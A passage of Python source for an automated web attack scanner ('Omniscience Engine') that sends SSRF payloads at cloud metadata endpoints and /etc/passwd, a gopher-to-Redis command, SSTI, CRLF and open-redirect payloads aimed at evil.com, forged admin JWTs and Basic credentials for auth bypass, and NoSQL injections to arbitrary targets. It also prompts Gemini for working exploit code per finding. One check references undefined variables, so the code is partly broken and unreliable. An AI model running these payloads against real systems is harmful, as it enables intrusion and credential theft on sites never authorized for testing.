                "http://metadata.google.internal/computeMetadata/v1/", # GCP
                "http://100.100.100.200/latest/meta-data/",            # Alibaba
                "file:///etc/passwd",
                "file:///c:/windows/win.ini",
                "http://localhost:22/",
                "http://localhost:80/",
                "http://localhost:3306/",
                "http://localhost:6379/",
                "http://localhost:27017/",
                "http://127.0.0.1:8080/",
                "http://0.0.0.0:22/",
                "http://[::]:80/",
                "dict://localhost:11211/",                             # Memcached
                "gopher://localhost:6379/_config%20set%20dir%20/tmp/", # Redis via gopher
            ]
            
            results = []
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            test_params = ["url", "uri", "link", "src", "source", "href", "path",
                          "dest", "destination", "redirect", "return", "return_to",
                          "next", "target", "data", "load", "file", "resource",
                          "endpoint", "callback", "webhook", "image", "img",
                          "avatar", "profile", "cover", "background", "fetch"]
            
            if parsed.query:
                params = dict(parse_qs(parsed.query))
                for param in params:
                    for payload in ssrf_callback_urls[:10]:
                        test_params_dict = {k: v[0] for k, v in params.items()}
                        test_params_dict[param] = payload
                        test_url = f"{base_url}?{urlencode(test_params_dict)}"
                        
                        try:
                            resp = self.session.get(test_url, timeout=10, allow_redirects=True)
                            body_lower = resp.text.lower()
                            
                            ssrf_indicators = [
                                "meta-data", "user-data", "computeMetadata",
                                "ami-id", "instance-id", "public-keys",
                                "root:", "daemon:", "Microsoft Windows",
                                "win.ini", "for 16-bit app support",
                                "ssh-rsa", "ssh-ed25519",
                            ]
                            
                            if any(indicator in body_lower for indicator in ssrf_indicators):
                                result = {
                                    "type": "ssrf",
                                    "url": test_url,
                                    "parameter": param,
                                    "payload": payload,
                                    "severity": "critical",
                                    "description": f"SSRF in parameter '{param}' — accessed internal resource"
                                }
                                results.append(result)
                                self.findings.append(result)
                        except:
                            pass
            
            return results

        def _check_ssti(self, url):
            """Test for Server-Side Template Injection."""
            ssti_tests = [
                # Jinja2 / Twig / Nunjucks
                ("jinja2_basic", "{{7*7}}", "49"),
                ("jinja2_hex", "{{7*'7'}}", "7777777"),
                ("twig_basic", "{{7*7}}", "49"),
                # Java / Freemarker
                ("freemarker", "${7*7}", "49"),
                ("freemarker_obj", "${7*'7'}", "7777777"),
                # Smarty
                ("smarty", "{$smarty.now}", ""),
                # Python / Mako
                ("mako", "${7*7}", "49"),
                # ERB (Ruby)
                ("erb", "<%= 7*7 %>", "49"),
                # Velocity
                ("velocity", "$7*7", "49"),
                # Jade / Pug
                ("jade", "#{7*7}", "49"),
                # Generic
                ("generic", "{{7*7}}", "49"),
                ("generic2", "{{7*'7'}}", "7777777"),
            ]
            
            results = []
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            test_params = ["name", "username", "user", "message", "comment", "title",
                          "template", "view", "page", "section", "content", "body",
                          "subject", "firstname", "lastname", "profile"]
            
            if parsed.query:
                params = dict(parse_qs(parsed.query))
                for param in params:
                    for engine, payload, expected in ssti_tests:
                        test_params_dict = {k: v[0] for k, v in params.items()}
                        test_params_dict[param] = payload
                        test_url = f"{base_url}?{urlencode(test_params_dict)}"
                        
                        try:
                            resp = self.session.get(test_url, timeout=10)
                            
                            if expected and expected in resp.text:
                                result = {
                                    "type": "ssti",
                                    "engine": engine,
                                    "url": test_url,
                                    "parameter": param,
                                    "payload": payload,
                                    "severity": "critical",
                                    "description": f"SSTI ({engine}) in parameter '{param}'"
                                }
                                results.append(result)
                                self.findings.append(result)
                        except:
                            pass
            
            return results

        def _check_open_redirect(self, url):
            """Test for Open Redirect vulnerabilities."""
            redirect_payloads = [
                "//evil.com",
                "//evil.com/",
                "https://evil.com",
                "http://evil.com",
                "///evil.com",
                "//evil.com%2f..",
                "/%5cevil.com",
                "http://evil.com:80",
                "https://evil.com:443",
                "//evil.com%40valid.com",
                "javascript:alert(1)//",
                "data:text/html,<script>alert(1)</script>",
                "%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d",  # URL-encoded
                "https://evil.com/?", 
                "https://evil.com#",
                "\\evil.com",
                "/url?q=https://evil.com",
            ]
            
            results = []
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            redirect_params = ["url", "return", "next", "redirect", "redir", "redirect_to",
                             "redirect_uri", "continue", "return_to", "return_path",
                             "r", "u", "to", "out", "view", "dest", "destination",
                             "target", "link", "href", "ref", "referer", "goto",
                             "forward", "forward_to", "page", "path", "load", "file"]
            
            if parsed.query:
                params = dict(parse_qs(parsed.query))
                for param in params:
                    for payload in redirect_payloads:
                        test_params_dict = {k: v[0] for k, v in params.items()}
                        test_params_dict[param] = payload
                        test_url = f"{base_url}?{urlencode(test_params_dict)}"
                        
                        try:
                            resp = self.session.get(test_url, timeout=10, allow_redirects=False)
                            
                            # Check redirect location header
                            location = resp.headers.get('Location', '')
                            if location:
                                # Check if redirect goes to external domain
                                if any(evil in location.lower() for evil in ['evil.com', 'javascript:', 'data:']):
                                    result = {
                                        "type": "open_redirect",
                                        "url": test_url,
                                        "parameter": param,
                                        "payload": payload,
                                        "redirect_to": location,
                                        "status_code": resp.status_code,
                                        "severity": "medium",
                                        "description": f"Open Redirect in parameter '{param}' to {location}"
                                    }
                                    results.append(result)
                                    self.findings.append(result)
                        except:
                            pass
            
            return results

        def _check_cors_misconfiguration(self, url):
            """Check for CORS misconfigurations."""
            results = []
            test_origins = [
                "https://evil.com",
                "null",
                "https://evil.com.evil.com",
                "https://evil.com:80",
                "http://127.0.0.1",
                "http://localhost",
                "https://evil.com/",
                "https://evil.com",
                "http://evil.com",
                "https://evil.com.evil.com",
                "https://evil.com%40evil.com",
            ]
            
            try:
                for origin in test_origins:
                    headers = {
                        "Origin": origin,
                        "Referer": origin
                    }
                    resp = self.session.get(url, headers=headers, timeout=10)
                    
                    acao = resp.headers.get('Access-Control-Allow-Origin', '')
                    acac = resp.headers.get('Access-Control-Allow-Credentials', '')
                    
                    if acao == '*' or acao == origin or acao == 'null':
                        severity = "high" if acac == 'true' else "medium"
                        result = {
                            "type": "cors_misconfiguration",
                            "url": url,
                            "origin": origin,
                            "acao": acao,
                            "credentials": acac == 'true',
                            "severity": severity,
                            "description": f"CORS allows origin '{origin}' (credentials: {acac})"
                        }
                        results.append(result)
                        self.findings.append(result)
            except:
                pass
            
            return results

        def _check_crlf(self, url):
            """Test for CRLF Injection."""
            crlf_payloads = [
                "%0d%0aSet-Cookie:%20test=crlf",
                "%0aSet-Cookie:%20test=crlf",
                "%0d%0aX-Custom:%20injected",
                "%0d%0aLocation:%20https://evil.com",
                "%0d%0a%0d%0a<script>alert(1)</script>",
                "%0dSet-Cookie:%20test=crlf",
                "%0d%0aRefresh:%200%3burl=https://evil.com",
            ]
            
            results = []
            
            if parsed.query:
                params = dict(parse_qs(parsed.query))
                for param in params:
                    for payload in crlf_payloads:
                        test_params_dict = {k: v[0] for k, v in params.items()}
                        test_params_dict[param] = payload
                        test_url = f"{base_url}?{urlencode(test_params_dict)}"
                        
                        try:
                            resp = self.session.get(test_url, timeout=10, allow_redirects=False)
                            
                            # Check for injected headers
                            if 'Set-Cookie' in resp.headers and 'test=crlf' in resp.headers.get('Set-Cookie', ''):
                                result = {
                                    "type": "crlf_injection",
                                    "url": test_url,
                                    "parameter": param,
                                    "payload": payload,
                                    "severity": "high",
                                    "description": f"CRLF Injection in parameter '{param}' — header injection confirmed"
                                }
                                results.append(result)
                                self.findings.append(result)
                        except:
                            pass
            
            return results

        def _check_cache_poisoning(self, url):
            """Test for Web Cache Poisoning."""
            results = []
            
            poison_headers = [
                ("X-Forwarded-Host", "evil.com"),
                ("X-Forwarded-Scheme", "http"),
                ("X-Forwarded-Proto", "http"),
                ("X-Original-URL", "/admin"),
                ("X-Rewrite-URL", "/admin"),
                ("X-Forwarded-Port", "9999"),
                ("X-Real-IP", "127.0.0.1"),
                ("X-Originating-IP", "127.0.0.1"),
                ("Client-IP", "127.0.0.1"),
                ("X-Forwarded-For", "127.0.0.1"),
                ("X-Forwarded-Prefix", "/evil"),
                ("X-HTTP-Method-Override", "POST"),
                ("X-HTTP-Method", "PUT"),
            ]
            
            try:
                resp_original = self.session.get(url, timeout=10)
                for header, value in poison_headers:
                    resp = self.session.get(url, headers={header: value}, timeout=10)
                    
                    # Check if the response reflects the injected header value
                    if value in resp.text or value in str(resp.headers):
                        result = {
                            "type": "cache_poisoning",
                            "url": url,
                            "header": header,
                            "value": value,
                            "severity": "high",
                            "description": f"Cache poisoning via header '{header}: {value}'"
                        }
                        results.append(result)
                        self.findings.append(result)
            except:
                pass
            
            return results

        def _check_api_endpoints(self, url):
            """Test API endpoints for common vulnerabilities."""
            results = []
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"
            
            # API discovery via common paths
            api_paths = [
                "/api", "/api/v1", "/api/v2", "/api/v3",
                "/graphql", "/graphiql", "/graphql/explorer",
                "/swagger.json", "/swagger/v1/swagger.json",
                "/api-docs", "/openapi.json", "/docs",
                "/api/swagger", "/api/docs", "/api/openapi.json",
                "/v2/api-docs", "/v3/api-docs",
                "/rest", "/rest/v1", "/rest/api",
                "/soap", "/soap/v1",
                "/odata", "/odata/v1",
            ]
            
            for path in api_paths:
                test_url = f"{base}{path}"
                try:
                    resp = self.session.get(test_url, timeout=10)
                    if resp.status_code in [200, 201, 202]:
                        result = {
                            "type": "api_discovery",
                            "url": test_url,
                            "status": resp.status_code,
                            "severity": "info",
                            "description": f"API endpoint discovered: {test_url}"
                        }
                        results.append(result)
                        self.findings.append(result)
                except:
                    pass
            
            # Common API parameter fuzzing
            api_base = None
            for path in ["/api/v1", "/api/v2", "/api"]:
                test_url = f"{base}{path}"
                try:
                    resp = self.session.get(test_url, timeout=10)
                    if resp.status_code in [200, 201, 202, 401, 403]:
                        api_base = test_url
                        break
                except:
                    pass
            
            if api_base:
                # Test authentication bypass
                auth_bypass_headers = [
                    {"X-Forwarded-For": "127.0.0.1"},
                    {"X-Real-IP": "127.0.0.1"},
                    {"X-Originating-IP": "127.0.0.1"},
                    {"X-Remote-IP": "127.0.0.1"},
                    {"X-Forwarded-Host": "localhost"},
                    {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ"},
                    {"Authorization": "Bearer null"},
                    {"Authorization": "Bearer undefined"},
                    {"Authorization": "Basic YWRtaW46YWRtaW4="},
                    {"Authorization": "Basic YWRtaW46cGFzc3dvcmQ="},
                    {"X-Admin": "true"},
                    {"X-Role": "admin"},
                    {"X-User": "admin"},
                ]
                
                for auth_header in auth_bypass_headers:
                    try:
                        resp = self.session.get(api_base, headers=auth_header, timeout=10)
                        if resp.status_code == 200 and resp.status_code not in [401, 403]:
                            result = {
                                "type": "api_auth_bypass",
                                "url": api_base,
                                "header": str(auth_header),
                                "status": resp.status_code,
                                "severity": "critical",
                                "description": f"API auth bypass at {api_base} with header {auth_header}"
                            }
                            results.append(result)
                            self.findings.append(result)
                    except:
                        pass
            
            return results

        def _check_graphql(self, url):
            """Test GraphQL endpoints for introspection and injection."""
            results = []
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"
            
            graphql_paths = ["/graphql", "/graphiql", "/graphql/explorer", "/v1/graphql", "/gql"]
            
            for path in graphql_paths:
                test_url = f"{base}{path}"
                try:
                    # Introspection query
                    introspection_query = {
                        "query": """
                            query {
                                __schema {
                                    types {
                                        name
                                        fields {
                                            name
                                            type {
                                                name
                                                kind
                                            }
                                        }
                                    }
                                }
                            }
                        """
                    }
                    
                    resp = self.session.post(test_url, json=introspection_query, timeout=10)
                    if resp.status_code == 200 and '__schema' in resp.text:
                        result = {
                            "type": "graphql_introspection",
                            "url": test_url,
                            "severity": "high",
                            "description": f"GraphQL introspection enabled at {test_url}"
                        }
                        results.append(result)
                        self.findings.append(result)
                    
                    # Test for SQLi via GraphQL
                    sqli_gql = {
                        "query": "query { user(id: \"1' OR '1'='1\") { id name email } }"
                    }
                    resp = self.session.post(test_url, json=sqli_gql, timeout=10)
                    if resp.status_code == 200 and any(indicator in resp.text.lower() for indicator in ["sql", "syntax", "mysql"]):
                        result = {
                            "type": "graphql_injection",
                            "url": test_url,
                            "severity": "critical",
                            "description": f"GraphQL injection at {test_url}"
                        }
                        results.append(result)
                        self.findings.append(result)
                        
                except:
                    pass
            
            return results

        def _check_idor(self, url):
            """Test for Insecure Direct Object References."""
            results = []
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            idor_params = ["id", "user_id", "uid", "pid", "post_id", "file_id",
                          "order_id", "invoice", "account", "account_id", "customer_id",
                          "document_id", "doc_id", "ref", "reference", "ticket_id"]
            
            if parsed.query:
                params = dict(parse_qs(parsed.query))
                for param in params:
                    if any(idor_p in param.lower() for idor_p in ["id", "uid", "pid", "account", "invoice", "ticket", "order", "ref"]):
                        # Try sequential IDs
                        for test_id in [1, 2, 3, 100, 1000, 9999]:
                            test_params_dict = {k: v[0] for k, v in params.items()}
                            test_params_dict[param] = str(test_id)
                            test_url = f"{base_url}?{urlencode(test_params_dict)}"
                            
                            try:
                                resp = self.session.get(test_url, timeout=10)
                                if resp.status_code == 200 and len(resp.text) > 100:
                                    # Check if response differs from unauthorized
                                    result = {
                                        "type": "idor",
                                        "url": test_url,
                                        "parameter": param,
                                        "tested_id": test_id,
                                        "severity": "high",
                                        "description": f"Possible IDOR in parameter '{param}' — accessed resource with ID {test_id}"
                                    }
                                    results.append(result)
                                    self.findings.append(result)
                                    break
                            except:
                                pass
            
            return results

        def _check_nosql_injection(self, url):
            """Test for NoSQL Injection (MongoDB)."""
            nosql_payloads = [
                '{"$gt": ""}',
                '{"$ne": ""}',
                '{"$gt": ""}',
                '[$gt]',
                '[$ne]',
                "admin' || '1'=='1",
                "admin' || 1==1",
                "'admin' || '1'=='1'",
                'true',
                '{"$where": "1==1"}',
            ]
            
            results = []
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            if parsed.query:
                params = dict(parse_qs(parsed.query))
                for param in params:
                    for payload in nosql_payloads:
                        test_params_dict = {k: v[0] for k, v in params.items()}
                        test_params_dict[param] = payload
                        test_url = f"{base_url}?{urlencode(test_params_dict)}"
                        
                        try:
                            resp = self.session.get(test_url, timeout=10)
                            body_lower = resp.text.lower()
                            if any(indicator in body_lower for indicator in ["mongodb", "mongo", "no sql", "unauthorized", "$where"]):
                                result = {
                                    "type": "nosql_injection",
                                    "url": test_url,
                                    "parameter": param,
                                    "payload": payload,
                                    "severity": "critical",
                                    "description": f"NoSQL Injection in parameter '{param}'"
                                }
                                results.append(result)
                                self.findings.append(result)
                        except:
                            pass
            
            return results

        def _check_wordpress(self, url):
            """WordPress-specific vulnerability scanning."""
            results = []
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"
            
            wp_checks = {
                "/wp-admin/": ("WordPress admin panel", "medium"),
                "/wp-admin/admin-ajax.php": ("WordPress AJAX API", "info"),
                "/wp-content/uploads/": ("WordPress uploads directory", "medium"),
                "/wp-content/plugins/": ("WordPress plugins directory", "medium"),
                "/wp-content/themes/": ("WordPress themes directory", "medium"),
                "/wp-includes/": ("WordPress includes directory", "low"),
                "/xmlrpc.php": ("WordPress XML-RPC enabled", "medium"),
                "/wp-config.php.bak": ("WordPress config backup", "critical"),
                "/wp-config.php~": ("WordPress config backup", "critical"),
                "/wp-config.old": ("WordPress config backup", "critical"),
                "/wp-config.txt": ("WordPress config exposed", "critical"),
                "/wp-json/": ("WordPress REST API", "info"),
                "/wp-json/wp/v2/users/": ("WordPress user enumeration", "medium"),
                "/?author=1": ("WordPress user enumeration", "medium"),
                "/wp-login.php": ("WordPress login page", "info"),
                "/wp-login.php?action=register": ("WordPress registration enabled", "low"),
                "/readme.html": ("WordPress version disclosure", "low"),
                "/license.txt": ("WordPress license disclosure", "low"),
                "/wp-cron.php": ("WordPress cron", "low"),
                "/wp-content/debug.log": ("WordPress debug log", "critical"),
                "/.wp-config.php.swp": ("WordPress vim swap file", "critical"),
            }
            
            for wp_path, (description, severity) in wp_checks.items():
                test_url = f"{base}{wp_path}"
                try:
                    resp = self.session.get(test_url, timeout=10, allow_redirects=False)
                    if resp.status_code == 200:
                        # For login page, verify it's actually WordPress
                        if "wp-login" in wp_path and "wordpress" not in resp.text.lower() and "wp-submit" not in resp.text:
                            continue
                        result = {
                            "type": "wordpress_enum",
                            "url": test_url,
                            "status": resp.status_code,
                            "severity": severity,
                            "description": f"WordPress: {description} ({resp.status_code})"
                        }
                        results.append(result)
                        self.findings.append(result)
                except:
                    pass
            
            return results

        def run_all_checks(self, url):
            """Execute all vulnerability checks against the target."""
            print(f"[*] Running all security checks on: {url}")
            
            checks = [
                ("Sensitive Paths", self._scan_sensitive_paths),
                ("SQL Injection", self._check_sql_injection),
                ("XSS", self._check_xss),
                ("LFI/RFI", self._check_lfi_rfi),
                ("Command Injection", self._check_command_injection),
                ("CSRF", self._check_csrf),
                ("SSRF", self._check_ssrf),
                ("SSTI", self._check_ssti),
                ("Open Redirect", self._check_open_redirect),
                ("CORS Misconfiguration", self._check_cors_misconfiguration),
                ("CRLF Injection", self._check_crlf),
                ("Cache Poisoning", self._check_cache_poisoning),
                ("API Testing", self._check_api_endpoints),
                ("GraphQL Testing", self._check_graphql),
                ("IDOR", self._check_idor),
                ("NoSQL Injection", self._check_nosql_injection),
                ("WordPress Enumeration", self._check_wordpress),
            ]
            
            for check_name, check_func in checks:
                try:
                    print(f"  └─ Running {check_name}...")
                    results = check_func(url)
                    if results:
                        print(f"     └─ Found {len(results)} issue(s)")
                except Exception as e:
                    print(f"     └─ Error in {check_name}: {str(e)[:80]}")
            
            return self.findings


class AIVulnerabilityAnalyzer:
    """AI-powered vulnerability analysis using Gemini."""
    
    def __init__(self, api_keys):
        self.api_keys = api_keys
        self.current_key_index = 0
        self.base_url = "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent"
    
    def _get_next_key(self):
        """Rotate through API keys to avoid rate limiting."""
        key = self.api_keys[self.current_key_index]
        self.current_key_index = (self.current_key_index + 1) % len(self.api_keys)
        return key
    
    def analyze_findings(self, findings, target):
        """Send findings to Gemini for intelligent analysis and prioritization."""
        if not findings:
            return None
        
        # Prepare findings summary for AI
        findings_summary = []
        for f in findings:
            findings_summary.append({
                "type": f.get("type", "unknown"),
                "severity": f.get("severity", "info"),
                "url": f.get("url", ""),
                "parameter": f.get("parameter", ""),
                "payload": f.get("payload", "")[:50] if f.get("payload") else "",
                "description": f.get("description", ""),
            })
        
        prompt = f"""You are a senior penetration testing AI. Analyze these findings from a security scan of {target}.

Findings ({len(findings_summary)} total):
{json.dumps(findings_summary, indent=2)}

Provide:
1. CRITICAL findings that need immediate attention (CVSS 9-10)
2. HIGH findings requiring prompt remediation (CVSS 7-8.9)
3. MEDIUM findings to address in normal cycle (CVSS 4-6.9)
4. LOW/INFO findings for awareness (CVSS 0-3.9)
5. Potential attack chains combining multiple findings
6. Recommended remediation steps prioritized by severity
7. Any false positives detected (findings that appear benign)

Format as structured JSON with these keys: critical_findings, high_findings, medium_findings, low_findings, attack_chains, remediation, false_positives
"""
        
        try:
            key = self._get_next_key()
            response = requests.post(
                f"{self.base_url}?key={key}",
                json={
                    "contents": [{"parts": [{"text": prompt}]}],
                    "generationConfig": {
                        "temperature": 0.1,
                        "maxOutputTokens": 4096,
                        "topP": 0.8,
                    }
                },
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                text = data.get('candidates', [{}])[0].get('content', {}).get('parts', [{}])[0].get('text', '')
                # Extract JSON from response
                json_match = re.search(r'```json\n(.*?)\n```', text, re.DOTALL)
                if json_match:
                    return json.loads(json_match.group(1))
                else:
                    # Try to parse entire response as JSON
                    try:
                        return json.loads(text)
                    except:
                        return {"raw_analysis": text}
            else:
                print(f"  [!] AI analysis failed (HTTP {response.status_code})")
                return None
        except Exception as e:
            print(f"  [!] AI analysis error: {str(e)[:80]}")
            return None

    def generate_exploit_suggestions(self, finding):
        """Ask Gemini for exploit suggestions for a specific finding."""
        prompt = f"""Given this vulnerability finding:
Type: {finding.get('type')}
URL: {finding.get('url')}
Parameter: {finding.get('parameter')}
Severity: {finding.get('severity')}

Provide:
1. A working PoC/exploit command or code snippet
2. Tools that can automate exploitation (sqlmap, Metasploit, etc.)
3. The specific CVE or technique reference
4. Step-by-step manual verification steps

Keep it concise and actionable."""
        
        try:
            key = self._get_next_key()
            response = requests.post(
                f"{self.base_url}?key={key}",
                json={
                    "contents": [{"parts": [{"text": prompt}]}],
                    "generationConfig": {"temperature": 0.2, "maxOutputTokens": 2048}
                },
                timeout=30
            )
            if response.status_code == 200:
                data = response.json()
                return data.get('candidates', [{}])[0].get('content', {}).get('parts', [{}])[0].get('text', '')
        except:
            pass
        return None


class ReportGenerator:
    """Generate comprehensive security reports in markdown and send via callback."""
    
    SEVERITY_COLORS = {
        "critical": "#FF0000",
        "high": "#FF4500",
        "medium": "#FFA500",
        "low": "#FFD700",
        "info": "#87CEEB"
    }
    
    def __init__(self, target, findings, ai_analysis=None):
        self.target = target
        self.findings = findings
        self.ai_analysis = ai_analysis
        self.timestamp = datetime.utcnow().isoformat()
    
    def _categorize_findings(self):
        """Group findings by severity and type."""
        categorized = {
            "critical": [],
            "high": [],
            "medium": [],
            "low": [],
            "info": []
        }
        by_type = {}
        
        for f in self.findings:
            sev = f.get("severity", "info")
            ftype = f.get("type", "unknown")
            
            if sev in categorized:
                categorized[sev].append(f)
            
            if ftype not in by_type:
                by_type[ftype] = []
            by_type[ftype].append(f)
        
        return categorized, by_type
    
    def generate_markdown_report(self):
        """Generate a detailed markdown report."""
        categorized, by_type = self._categorize_findings()
        
        report = []
        
        # Header
        report.append(f"# Vulnerability Assessment Report")
        report.append(f"")
        report.append(f"**Target:** `{self.target}`")
        report.append(f"**Scan Date:** `{self.timestamp}`")
        report.append(f"**Total Findings:** `{len(self.findings)}`")
        report.append(f"")
        
        # Severity Summary
        report.append(f"## Severity Summary")
        report.append(f"")
        report.append(f"| Severity | Count |")
        report.append(f"|----------|-------|")
        for sev in ["critical", "high", "medium", "low", "info"]:
            count = len(categorized[sev])
            if count > 0:
                report.append(f"| **{sev.upper()}** | {count} |")
        report.append(f"")
        
        # AI Analysis Section
        if self.ai_analysis:
            report.append(f"## AI-Powered Analysis")
            report.append(f"")
            
            if self.ai_analysis.get("critical_findings"):
                report.append(f"### Critical Findings (CVSS 9-10)")
                report.append(f"")
                for item in self.ai_analysis["critical_findings"]:
                    if isinstance(item, dict):
                        report.append(f"- **{item.get('title', item.get('type', 'Unknown'))}**")
                        report.append(f"  - {item.get('description', '')}")
                    else:
                        report.append(f"- {item}")
                report.append(f"")
            
            if self.ai_analysis.get("high_findings"):
                report.append(f"### High Findings (CVSS 7-8.9)")
                report.append(f"")
                for item in self.ai_analysis["high_findings"]:
                    if isinstance(item, dict):
                        report.append(f"- **{item.get('title', item.get('type', 'Unknown'))}**")
                        report.append(f"  - {item.get('description', '')}")
                    else:
                        report.append(f"- {item}")
                report.append(f"")
            
            if self.ai_analysis.get("attack_chains"):
                report.append(f"### Potential Attack Chains")
                report.append(f"")
                for chain in self.ai_analysis["attack_chains"]:
                    if isinstance(chain, dict):
                        report.append(f"- **{chain.get('name', 'Chain')}**")
                        report.append(f"  - {chain.get('description', '')}")
                        report.append(f"  - Steps: {', '.join(chain.get('steps', []))}")
                    else:
                        report.append(f"- {chain}")
                report.append(f"")
            
            if self.ai_analysis.get("remediation"):
                report.append(f"### Recommended Remediation")
                report.append(f"")
                for item in self.ai_analysis["remediation"]:
                    if isinstance(item, dict):
                        report.append(f"- **Priority {item.get('priority', 'N/A')}:** {item.get('action', item.get('description', ''))}")
                    else:
                        report.append(f"- {item}")
                report.append(f"")
            
            if self.ai_analysis.get("false_positives"):
                report.append(f"### False Positives Identified")
                report.append(f"")
                for fp in self.ai_analysis["false_positives"]:
                    if isinstance(fp, dict):
                        report.append(f"- ~~{fp.get('finding', fp.get('description', ''))}~~ — {fp.get('reason', 'Marked as false positive')}")
                    else:
                        report.append(f"- ~~{fp}~~")
                report.append(f"")
        
        # Detailed Findings by Type
        report.append(f"## Detailed Findings")
        report.append(f"")
        
        type_names = {
            "sensitive_path": "Exposed Sensitive Paths",
            "sql_injection": "SQL Injection",
            "sql_injection_post": "SQL Injection (POST)",
            "reflected_xss": "Reflected Cross-Site Scripting (XSS)",
            "stored_xss": "Stored Cross-Site Scripting (XSS)",
            "lfi": "Local File Inclusion (LFI)",
            "rfi": "Remote File Inclusion (RFI)",
            "command_injection": "OS Command Injection",
            "csrf": "Cross-Site Request Forgery (CSRF)",
            "ssrf": "Server-Side Request Forgery (SSRF)",
            "ssti": "Server-Side Template Injection (SSTI)",
            "open_redirect": "Open Redirect",
            "cors_misconfiguration": "CORS Misconfiguration",
            "crlf_injection": "CRLF Injection",
            "cache_poisoning": "Web Cache Poisoning",
            "api_discovery": "API Endpoint Discovery",
            "api_auth_bypass": "API Authentication Bypass",
            "graphql_introspection": "GraphQL Introspection",
            "graphql_injection": "GraphQL Injection",
            "idor": "Insecure Direct Object Reference (IDOR)",
            "nosql_injection": "NoSQL Injection",
            "wordpress_enum": "WordPress Enumeration"
        }
        
        for ftype in sorted(by_type.keys()):
            ftype_name = type_names.get(ftype, ftype.replace("_", " ").title())
            findings_list = by_type[ftype]
            
            report.append(f"### {ftype_name} ({len(findings_list)})")
            report.append(f"")
            
            for f in findings_list:
                severity = f.get("severity", "info").upper()
                url = f.get("url", f.get("path", ""))
                param = f.get("parameter", "")
                payload = f.get("payload", "")
                description = f.get("description", "No description")
                
                report.append(f"#### {description}")
                report.append(f"")
                report.append(f"| Field | Value |")
                report.append(f"|-------|-------|")
                report.append(f"| **Severity** | {severity} |")
                if url:
                    report.append(f"| **URL** | `{url}` |")
                if param:
                    report.append(f"| **Parameter** | `{param}` |")
                if payload:
                    report.append(f"| **Payload** | `{payload}` |")
                report.append(f"")
                
                # Generate CVSS-like score
                cvss_score = self._calculate_cvss(f)
                if cvss_score:
                    report.append(f"**Estimated CVSS Score:** {cvss_score['score']} ({cvss_score['severity']})")
                    report.append(f"")
            
            report.append(f"")
        
        # Footer
        report.append(f"---")
        report.append(f"*Report generated by Omniscience Engine — {self.timestamp}*")
        report.append(f"*Tools: WebAuditEngine, AIVulnerabilityAnalyzer, GitHub Actions, Cloudflare Workers*")
        
        return "\n".join(report)
    
    def _calculate_cvss(self, finding):
        """Calculate an approximate CVSS 3.1 score based on finding attributes."""
        severity_map = {
            "critical": (9.0, 10.0),
            "high": (7.0, 8.9),
            "medium": (4.0, 6.9),
            "low": (0.1, 3.9),
            "info": (0.0, 0.0)
        }
        
        sev = finding.get("severity", "info")
        if sev in severity_map:
            low, high = severity_map[sev]
            base_score = round((low + high) / 2, 1)
            
            return {
                "score": base_score,
                "severity": sev.upper(),
                "vector": f"AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N" if sev in ["critical", "high"] else \
                         f"AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N"
            }
        return None
    
    def generate_summary_section(self):
        """Generate a compact summary for Telegram/notification delivery."""
        categorized, _ = self._categorize_findings()
        
        summary = []
        summary.append(f"📋 **Scan Complete: {self.target}**")
        summary.append(f"")
        summary.append(f"**Total Findings:** {len(self.findings)}")
        summary.append(f"")
        
        sev_icons = {
            "critical": "🔴",
            "high": "🟠",
            "medium": "🟡",
            "low": "🟢",
            "info": "🔵"
        }
        
        for sev in ["critical", "high", "medium", "low", "info"]:
            count = len(categorized[sev])
            if count > 0:
                summary.append(f"{sev_icons.get(sev, '⚪')} **{sev.upper()}:** {count}")
        
        summary.append(f"")
        
        # Top findings
        all_findings = []
        for sev in ["critical", "high", "medium"]:
            all_findings.extend(categorized[sev])
        
        if all_findings:
            summary.append(f"**Top Issues:**")
            for f in all_findings[:5]:
                desc = f.get("description", "Unknown")[:80]
                summary.append(f"  • {desc}")
        
        summary.append(f"")
        summary.append(f"*Full report being generated...*")
        
        return "\n".join(summary)


class ScreenshotCapture:
    """Capture screenshots of target pages using Playwright."""
    
    def __init__(self):
        self.screenshot_dir = "/tmp/screenshots"
        os.makedirs(self.screenshot_dir, exist_ok=True)
    
    def capture(self, url, full_page=True, width=1280, height=720):
        """Capture a screenshot of the target URL."""
        try:
            from playwright.sync_api import sync_playwright
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            safe_name = re.sub(r'[^a-zA-Z0-9]', '_', url[:50])
            filename = f"{self.screenshot_dir}/{safe_name}_{timestamp}.png"
            
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                context = browser.new_context(
                    viewport={"width": width, "height": height},
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    ignore_https_errors=True
                )
                page = context.new_page()
                page.set_default_timeout(30000)
                
                try:
                    page.goto(url, wait_until="networkidle", timeout=30000)
                    page.wait_for_timeout(2000)
                    
                    if full_page:
                        page.screenshot(path=filename, full_page=True)
                    else:
                        page.screenshot(path=filename)
                    
                    print(f"  [✓] Screenshot saved: {filename}")
                    browser.close()
                    return filename
                    
                except Exception as e:
                    print(f"  [!] Screenshot error for {url}: {str(e)[:60]}")
                    try:
                        page.screenshot(path=filename)
                        browser.close()
                        return filename
                    except:
                        browser.close()
                        return None
                        
        except ImportError:
            print("  [!] Playwright not installed. Install with: pip install playwright && python -m playwright install chromium")
            return None
